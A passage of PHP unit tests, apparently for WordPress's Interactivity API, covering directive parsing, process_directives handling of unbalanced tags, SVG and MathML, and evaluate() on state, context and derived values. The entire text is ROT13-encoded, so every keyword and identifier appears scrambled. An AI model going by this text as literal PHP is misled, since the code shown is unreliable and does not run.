	 * @pbiref ::rkgenpg_qverpgvir_inyhr
	 */
	choyvp shapgvba grfg_rkgenpg_qverpgvir_inyhr_vainyvq_wfba() {
		$rkgenpg_qverpgvir_inyhr = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'rkgenpg_qverpgvir_inyhr' );
		$rkgenpg_qverpgvir_inyhr->frgNpprffvoyr( gehr );

		// Vainyvq WFBA qhr gb zvffvat dhbgrf. Ergheaf gur bevtvany inyhr.
		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '{ vfBcra: snyfr }', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', '{ vfBcra: snyfr }' ), $erfhyg );

		// Ahyy fgevat. Ergheaf ahyy.
		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'ahyy', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );
	}

	/**
	 * Grfgf gur novyvgl gb rkgenpg cersvk naq fhssvk sebz n qverpgvir nggevohgr
	 * anzr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rkgenpg_cersvk_naq_fhssvk
	 */
	choyvp shapgvba grfg_rkgenpg_cersvk_naq_fhssvk() {
		$rkgenpg_cersvk_naq_fhssvk = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'rkgenpg_cersvk_naq_fhssvk' );
		$rkgenpg_cersvk_naq_fhssvk->frgNpprffvoyr( gehr );

		$erfhyg = $rkgenpg_cersvk_naq_fhssvk->vaibxr( $guvf->vagrenpgvivgl, 'qngn-jc-vagrenpgvir' );
		$guvf->nffregFnzr( neenl( 'qngn-jc-vagrenpgvir' ), $erfhyg );

		$erfhyg = $rkgenpg_cersvk_naq_fhssvk->vaibxr( $guvf->vagrenpgvivgl, 'qngn-jc-ovaq--fep' );
		$guvf->nffregFnzr( neenl( 'qngn-jc-ovaq', 'fep' ), $erfhyg );

		$erfhyg = $rkgenpg_cersvk_naq_fhssvk->vaibxr( $guvf->vagrenpgvivgl, 'qngn-jc-sbb--naq--one' );
		$guvf->nffregFnzr( neenl( 'qngn-jc-sbb', 'naq--one' ), $erfhyg );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` zrgubq qbrfa'g punatr gur UGZY vs vg
	 * qbrfa'g pbagnva qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_qb_abguvat_jvgubhg_qverpgvirf() {
		$ugzy           = '<qvi>Vaare pbagrag urer</qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $cebprffrq_ugzy );

		$ugzy           = '<qvi><fcna>Pbagrag</fcna><fgebat>Zber Pbagrag</fgebat></qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $cebprffrq_ugzy );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` zrgubq punatrf gur UGZY vs vg pbagnvaf
	 * qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_punatrf_ugzy_jvgu_onynaprq_gntf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'vq' => 'fbzr-vq' ) );
		$ugzy           = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt();
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf ubj `cebprff_qverpgvirf` unaqyrf UGZY jvgu haxabja qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_qbrfag_snvy_jvgu_haxabja_qverpgvirf() {
		$ugzy           = '<qvi qngn-jc-haxabja=\"\">Grkg</qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $cebprffrq_ugzy );
	}

	/**
	 * Grfgf gung qverpgvirf ner cebprffrq va gur pbeerpg beqre.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_cebprff_gur_qverpgvirf_va_gur_pbeerpg_beqre() {
		$ugzy           = '
			<qvi
				qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"grfg\" }\'
				qngn-jc-pbagrkg=\'{ \"vfPynff\": gehr, \"vq\": \"fbzr-vq\", \"grkg\": \"Hcqngrq\", \"qvfcynl\": \"abar\" }\'
				qngn-jc-ovaq--vq=\"pbagrkg.vq\"
				qngn-jc-pynff--fbzr-pynff=\"pbagrkg.vfPynff\"
				qngn-jc-fglyr--qvfcynl=\"pbagrkg.qvfcynl\"
				qngn-jc-grkg=\"pbagrkg.grkg\"
			>Grkg</qvi>';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt();
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$guvf->nffregFnzr( 'fbzr-pynff', $c->trg_nggevohgr( 'pynff' ) );
		$guvf->nffregFnzr( 'qvfcynl:abar;', $c->trg_nggevohgr( 'fglyr' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'Hcqngrq', $c->trg_hcqngrq_ugzy() );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'Grkg', $c->trg_hcqngrq_ugzy() );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` ergheaf gur fnzr UGZY vs vg pbagnvaf
	 * haonynaprq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 *
	 * @qngnCebivqre qngn_ugzy_jvgu_haonynaprq_gntf
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 *
	 * @cnenz fgevat $ugzy UGZY pbagnvavat haonynaprq gntf naq nyfb n qverpgvir.
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_qbrfag_punatr_ugzy_vs_pbagnvaf_haonynaprq_gntf( $ugzy ) {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'vq' => 'fbzr-vq' ) );

		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt();
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_ugzy_jvgu_haonynaprq_gntf() {
		erghea neenl(
			'QVI pybfre nsgre'   => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi></qvi>' ),
			'QVI bcrare nsgre'   => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi><qvi>' ),
			'QVI bcrare orsber'  => neenl( '<qvi><qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi>' ),
			'QVI pybfre orsber'  => neenl( '</qvi><qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi>' ),
			'QVI bcrare vafvqr'  => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare<qvi>pbagrag</qvi>' ),
			'QVI pybfre vafvqr'  => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare</qvi>pbagrag</qvi>' ),
			'FCNA bcrare vafvqr' => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\"><fcna>Vaare pbagrag</qvi>' ),
			'FCNA pybfre nsgre'  => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Vaare pbagrag</qvi></fcna>' ),
			'FCNA bireynccvat'   => neenl( '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\"><fcna>Vaare pbagrag</qvi></fcna>' ),
		);
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` cebprff gur UGZY bhgfvqr n FIT gnt.
	 *
	 * @gvpxrg 60517
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_punatrf_ugzy_vs_pbagnvaf_fitf() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'vq'    => 'fbzr-vq',
				'jvqgu' => '100',
			)
		);
		$ugzy           = '
			<urnqre>
				<fit urvtug=\"100\">
					<gvgyr>Erq Pvepyr</gvgyr>
					<pvepyr pk=\"50\" pl=\"50\" e=\"40\" fgebxr=\"oynpx\" fgebxr-jvqgu=\"3\" svyy=\"erq\" />
				</fit>
				<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\"></qvi>
			</urnqre>
		';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'qvi' );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` qbrf abg cebprff gur UGZY
	 * vafvqr FIT gntf.
	 *
	 * @gvpxrg 60517
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe::fxvc_gb_gnt_pybfre
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_qbrf_abg_punatr_vaare_ugzy_va_fitf() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'vq' => 'fbzr-vq',
			)
		);
		$ugzy           = '
			<urnqre>
				<fit urvtug=\"100\">
					<pvepyr pk=\"50\" pl=\"50\" e=\"40\" fgebxr=\"oynpx\" fgebxr-jvqgu=\"3\" svyy=\"erq\" />
					<t qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\" />
				</fit>
			</urnqre>
		';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'qvi' );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` cebprff gur UGZY bhgfvqr gur
	 * ZnguZY gnt.
	 *
	 * @gvpxrg 60517
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_punatr_ugzy_vs_pbagnvaf_zngu() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'vq'   => 'fbzr-vq',
				'zngu' => 'zy-vq',
			)
		);
		$ugzy           = '
			<urnqre>
				<zngu qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.zngu\">
					<zv>k</zv>
					<zb>=</zb>
					<zv>1</zv>
				</zngu>
				<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\"></qvi>
			</urnqre>
		';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'zngu' );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( 'qvi' );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `cebprff_qverpgvirf` qbrf abg cebprff gur UGZY
	 * vafvqr ZnguZY gntf.
	 *
	 * @gvpxrg 60517
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::_cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe::fxvc_gb_gnt_pybfre
	 */
	choyvp shapgvba grfg_cebprff_qverpgvirf_qbrf_abg_punatr_vaare_ugzy_va_zngu() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'vq' => 'fbzr-vq',
			)
		);
		$ugzy           = '
			<urnqre>
				<zngu qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.zngu\">
					<zebj qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\" />
					<zv>k</zv>
					<zb>=</zb>
					<zv>1</zv>
				</zngu>
			</urnqre>
		';
		$cebprffrq_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c              = arj JC_UGZY_Gnt_Cebprffbe( $cebprffrq_ugzy );
		$c->arkg_gnt( 'qvi' );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Vaibxrf gur cevingr `rinyhngr` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $qverpgvir_inyhr   Gur qverpgvir nggevohgr inyhr gb rinyhngr.
	 * @erghea zvkrq Gur erfhyg bs gur rinyhngr zrgubq.
	 */
	cevingr shapgvba rinyhngr( $qverpgvir_inyhr ) {
		/*
		 * Gur tybony JC_Vagrenpgvivgl_NCV vafgnapr vf zbzragnevyl ercynprq gb
		 * znxr tybony shapgvbaf yvxr `jc_vagrenpgvivgl_fgngr` naq
		 * `jc_vagrenpgvivgl_trg_pbasvt` jbex nf rkcrpgrq.
		 */
		tybony $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl_ceri = $jc_vagrenpgvivgl;
		$jc_vagrenpgvivgl      = $guvf->vagrenpgvivgl;

		$rinyhngr = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'rinyhngr' );
		$rinyhngr->frgNpprffvoyr( gehr );

		$erfhyg = $rinyhngr->vaibxrNetf( $guvf->vagrenpgvivgl, neenl( $qverpgvir_inyhr ) );

		// Erfgber gur bevtvany JC_Vagrenpgvivgl_NCV vafgnapr.
		$jc_vagrenpgvivgl = $jc_vagrenpgvivgl_ceri;

		erghea $erfhyg;
	}

	/**
	 * Grfgf gung gur `rinyhngr` zrgubq bcrengrf pbeerpgyl sbe inyvq rkcerffvbaf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_inyhr() {
		$bow       = arj fgqPynff();
		$bow->cebc = 'bowrpg cebcregl';
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'xrl'       => 'zlCyhtva-fgngr',
				'bow'       => $bow,
				'neeNpprff' => arj pynff() vzcyrzragf NeenlNpprff {
					choyvp shapgvba bssfrgRkvfgf( $bssfrg ): obby {
						erghea gehr;
					}

					#[\ErgheaGlcrJvyyPunatr]
					choyvp shapgvba bssfrgTrg( $bssfrg ) {
						erghea $bssfrg;
					}

					choyvp shapgvba bssfrgFrg( $bssfrg, $inyhr ): ibvq {}

					choyvp shapgvba bssfrgHafrg( $bssfrg ): ibvq {}
				},
			)
		);
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'xrl' => 'bgureCyhtva-fgngr' ) );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl( 'xrl' => 'zlCyhtva-pbagrkg' ),
				'bgureCyhtva' => neenl( 'xrl' => 'bgureCyhtva-pbagrkg' ),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.xrl' );
		$guvf->nffregFnzr( 'zlCyhtva-fgngr', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'pbagrkg.xrl' );
		$guvf->nffregFnzr( 'zlCyhtva-pbagrkg', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::fgngr.xrl' );
		$guvf->nffregFnzr( 'bgureCyhtva-fgngr', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::pbagrkg.xrl' );
		$guvf->nffregFnzr( 'bgureCyhtva-pbagrkg', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'fgngr.bow.cebc' );
		$guvf->nffregFnzr( 'bowrpg cebcregl', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'fgngr.neeNpprff.1' );
		$guvf->nffregFnzr( '1', $erfhyg );
	}

	/**
	 * Grfgf gung gur `rinyhngr` zrgubq bcrengrf pbeerpgyl jura hfrq jvgu gur
	 * artngvba bcrengbe (!).
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_inyhr_artngvba() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'xrl' => 'zlCyhtva-fgngr' ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'xrl' => 'bgureCyhtva-fgngr' ) );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl( 'xrl' => 'zlCyhtva-pbagrkg' ),
				'bgureCyhtva' => neenl( 'xrl' => 'bgureCyhtva-pbagrkg' ),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( '!fgngr.xrl' );
		$guvf->nffregSnyfr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( '!pbagrkg.xrl' );
		$guvf->nffregSnyfr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::!fgngr.xrl' );
		$guvf->nffregSnyfr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::!pbagrkg.xrl' );
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * Grfgf gung gur `rinyhngr` zrgubq bcrengrf pbeerpgyl jura hfrq jvgu gur
	 * artngvba bcrengbe (!) jvgu aba-rkvfgrag cnguf.
	 *
	 * @gvpxrg 62374
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_inyhr_artngvba_aba_rkvfgrag_cngu() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl() );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl() );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl(),
				'bgureCyhtva' => neenl(),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( '!fgngr.zvffvat' );
		$guvf->nffregGehr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( '!pbagrkg.zvffvat' );
		$guvf->nffregGehr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::!fgngr.qrrcyl.arfgrq.zvffvat' );
		$guvf->nffregGehr( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::!pbagrkg.qrrcyl.arfgrq.zvffvat' );
		$guvf->nffregGehr( $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq jvgu aba-rkvfgrag cnguf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_aba_rkvfgrag_cngu() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'xrl' => 'zlCyhtva-fgngr' ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'xrl' => 'bgureCyhtva-fgngr' ) );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl( 'xrl' => 'zlCyhtva-pbagrkg' ),
				'bgureCyhtva' => neenl( 'xrl' => 'bgureCyhtva-pbagrkg' ),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.abaRkvfgragXrl' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'pbagrkg.abaRkvfgragXrl' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::fgngr.abaRkvfgragXrl' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::pbagrkg.abaRkvfgragXrl' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( ' fgngr.xrl' ); // Rkgen fcnpr.
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva:: fgngr.xrl' ); // Rkgen fcnpr.
		$guvf->nffregAhyy( $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe ergevrivat arfgrq inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_arfgrq_inyhr() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'arfgrq' => neenl( 'xrl' => 'zlCyhtva-fgngr-arfgrq' ),
			)
		);
		$guvf->vagrenpgvivgl->fgngr(
			'bgureCyhtva',
			neenl(
				'arfgrq' => neenl( 'xrl' => 'bgureCyhtva-fgngr-arfgrq' ),
			)
		);
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl(
					'arfgrq' => neenl( 'xrl' => 'zlCyhtva-pbagrkg-arfgrq' ),
				),
				'bgureCyhtva' => neenl(
					'arfgrq' => neenl( 'xrl' => 'bgureCyhtva-pbagrkg-arfgrq' ),
				),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.arfgrq.xrl' );
		$guvf->nffregFnzr( 'zlCyhtva-fgngr-arfgrq', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'pbagrkg.arfgrq.xrl' );
		$guvf->nffregFnzr( 'zlCyhtva-pbagrkg-arfgrq', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::fgngr.arfgrq.xrl' );
		$guvf->nffregFnzr( 'bgureCyhtva-fgngr-arfgrq', $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::pbagrkg.arfgrq.xrl' );
		$guvf->nffregFnzr( 'bgureCyhtva-pbagrkg-arfgrq', $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe aba inyvq anzrfcnpr inyhrf.
	 *
	 * @gvpxrg 61044
	 *
	 * @pbiref ::rinyhngr
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_hainyvq_anzrfcnprf() {
		$guvf->frg_vagreany_pbagrkg_fgnpx( neenl() );
		$guvf->frg_vagreany_anzrfcnpr_fgnpx();

		$erfhyg = $guvf->rinyhngr( 'cngu', 'ahyy' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'cngu', '' );
		$guvf->nffregAhyy( $erfhyg );

		$erfhyg = $guvf->rinyhngr( 'cngu', '{}' );
		$guvf->nffregAhyy( $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe qrevirq fgngr shapgvbaf.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::rinyhngr
	 * @pbiref jc_vagrenpgvivgl_fgngr
	 * @pbiref jc_vagrenpgvivgl_trg_pbagrkg
	 */
	choyvp shapgvba grfg_rinyhngr_qrevirq_fgngr() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'xrl'     => 'zlCyhtva-fgngr',
				'qrevirq' => shapgvba () {
					$fgngr   = jc_vagrenpgvivgl_fgngr();
					$pbagrkg = jc_vagrenpgvivgl_trg_pbagrkg();
					erghea 'Qrevirq fgngr: ' .
						$fgngr['xrl'] .
						\"\a\" .
						'Qrevirq pbagrkg: ' .
						$pbagrkg['xrl'];
				},
			)
		);
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva' => neenl(
					'xrl' => 'zlCyhtva-pbagrkg',
				),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.qrevirq' );
		$guvf->nffregFnzr( \"Qrevirq fgngr: zlCyhtva-fgngr\aQrevirq pbagrkg: zlCyhtva-pbagrkg\", $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe qrevirq fgngr shapgvbaf npprffvat n
	 * qvssrerag anzrfcnpr.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::rinyhngr
	 * @pbiref jc_vagrenpgvivgl_fgngr
	 * @pbiref jc_vagrenpgvivgl_trg_pbagrkg
	 */
	choyvp shapgvba grfg_rinyhngr_qrevirq_fgngr_npprffvat_qvssrerag_anzrfcnpr() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'xrl'     => 'zlCyhtva-fgngr',
				'qrevirq' => shapgvba () {
					$fgngr   = jc_vagrenpgvivgl_fgngr( 'bgureCyhtva' );
					$pbagrkg = jc_vagrenpgvivgl_trg_pbagrkg( 'bgureCyhtva' );
					erghea 'Qrevirq fgngr: ' .
						$fgngr['xrl'] .
						\"\a\" .
						'Qrevirq pbagrkg: ' .
						$pbagrkg['xrl'];
				},
			)
		);
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'xrl' => 'bgureCyhtva-fgngr' ) );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl(
					'xrl' => 'zlCyhtva-pbagrkg',
				),
				'bgureCyhtva' => neenl(
					'xrl' => 'bgureCyhtva-pbagrkg',
				),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'fgngr.qrevirq' );
		$guvf->nffregFnzr( \"Qrevirq fgngr: bgureCyhtva-fgngr\aQrevirq pbagrkg: bgureCyhtva-pbagrkg\", $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe qrevirq fgngr shapgvbaf qrsvarq va n
	 * qvssrerag anzrfcnpr.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::rinyhngr
	 * @pbiref jc_vagrenpgvivgl_fgngr
	 * @pbiref jc_vagrenpgvivgl_trg_pbagrkg
	 */
	choyvp shapgvba grfg_rinyhngr_qrevirq_fgngr_qrsvarq_va_qvssrerag_anzrfcnpr() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'xrl' => 'zlCyhtva-fgngr' ) );
		$guvf->vagrenpgvivgl->fgngr(
			'bgureCyhtva',
			neenl(
				'xrl'     => 'bgureCyhtva-fgngr',
				'qrevirq' => shapgvba () {
					$fgngr   = jc_vagrenpgvivgl_fgngr();
					$pbagrkg = jc_vagrenpgvivgl_trg_pbagrkg();
					erghea 'Qrevirq fgngr: ' .
						$fgngr['xrl'] .
						\"\a\" .
						'Qrevirq pbagrkg: ' .
						$pbagrkg['xrl'];
				},
			)
		);
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva'    => neenl(
					'xrl' => 'zlCyhtva-pbagrkg',
				),
				'bgureCyhtva' => neenl(
					'xrl' => 'bgureCyhtva-pbagrkg',
				),
			)
		);
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$erfhyg = $guvf->rinyhngr( 'bgureCyhtva::fgngr.qrevirq' );
		$guvf->nffregFnzr( \"Qrevirq fgngr: bgureCyhtva-fgngr\aQrevirq pbagrkg: bgureCyhtva-pbagrkg\", $erfhyg );
	}

	/**
	 * Grfgf gur `rinyhngr` zrgubq sbe qrevirq fgngr shapgvbaf gung guebj.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::rinyhngr
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_rinyhngr_qrevirq_fgngr_gung_guebjf() {
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'qrevirqGungGuebjf' => shapgvba () {
					guebj arj Reebe( 'Fbzrguvat onq unccrarq.' );
				},
			)
		);
		$guvf->frg_vagreany_pbagrkg_fgnpx();
